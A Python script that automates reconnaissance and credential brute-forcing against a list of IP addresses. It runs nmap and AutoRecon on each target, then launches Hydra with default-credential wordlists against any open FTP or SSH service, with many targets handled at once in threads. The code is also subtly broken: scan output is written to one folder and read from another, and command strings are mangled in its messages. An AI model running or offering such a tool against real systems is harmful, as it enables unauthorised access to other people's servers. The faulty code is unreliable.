#!/usr/bin/env python3
import os
import sys
import subprocess
from concurrent.futures import ThreadPoolExecutor, as_completed

def run_command(command, output_file):
    """Runs a shell command and writes the output to a file."""
    try:
        with open(output_file, "w") as f:
            process = subprocess.run(command, shell=True, stdout=f, stderr=f, text=True)
        if process.returncode == 0:
            print(f"[+] Successfully executed: {' '.join(command)}")
        else:
            print(f"[-] Command failed: {' '.join(command)}")
    except Exception as e:
        print(f"[!] Error executing command {' '.join(command)}: {e}")

def run_autorecon(ip):
    """Run AutoRecon over the provided IP and save the results."""
    print(f"[+] Running AutoRecon for {ip}")
    autorecon_command = f"autorecon {ip}"
    run_command(autorecon_command, f"logs/{ip}_autorecon.log")

def run_nmap(ip):
    """Run Nmap scan to identify open ports 21 and 22."""
    print(f"[+] Running Nmap scan for {ip}")
    nmap_command = f"nmap -p 21,22 --open {ip}"
    run_command(nmap_command, f"logs/{ip}_nmap_scan.log")

def brute_force_service(ip, service):
    """Run Hydra for brute-forcing the given service."""
    if service == "ftp":
        print(f"[+] Running Hydra for FTP on {ip}")
        hydra_command = f"hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt {ip} ftp"
        run_command(hydra_command, f"results/{ip}_ftp_bruteforce.log")
    elif service == "ssh":
        print(f"[+] Running Hydra for SSH on {ip}")
        hydra_command = f"hydra -C /usr/share/seclists/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt {ip} ssh"
        run_command(hydra_command, f"results/{ip}_ssh_bruteforce.log")

def process_ip(ip):
    """Process each IP by running the required scans and brute-forcing."""
    # Run AutoRecon and Nmap scans
    run_nmap(ip)
    run_autorecon(ip)

    # Read Nmap scan results to check for open ports
    nmap_log_file = f"results/{ip}_nmap_scan.log"
    open_ports = []
    with open(nmap_log_file, "r") as f:
        for line in f:
            if "21/tcp open" in line:
                open_ports.append("ftp")
            if "22/tcp open" in line:
                open_ports.append("ssh")

    # If any service is identified, run the corresponding brute-force attack
    for service in open_ports:
        brute_force_service(ip, service)

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 script.py <IP1> <IP2> ... <IPN>")
        sys.exit(1)

    ips = sys.argv[1:]
    os.makedirs("logs", exist_ok=True)

    # Using ThreadPoolExecutor for simultaneous execution of tasks
    with ThreadPoolExecutor(max_workers=len(ips)) as executor:
        future_to_ip = {executor.submit(process_ip, ip): ip for ip in ips}
        for future in as_completed(future_to_ip):
            ip = future_to_ip[future]
            try:
                future.result()
                print(f"[+] Completed processing for IP: {ip}")
            except Exception as e:
                print(f"[!] Error processing IP {ip}: {e}")

if __name__ == "__main__":
    main()
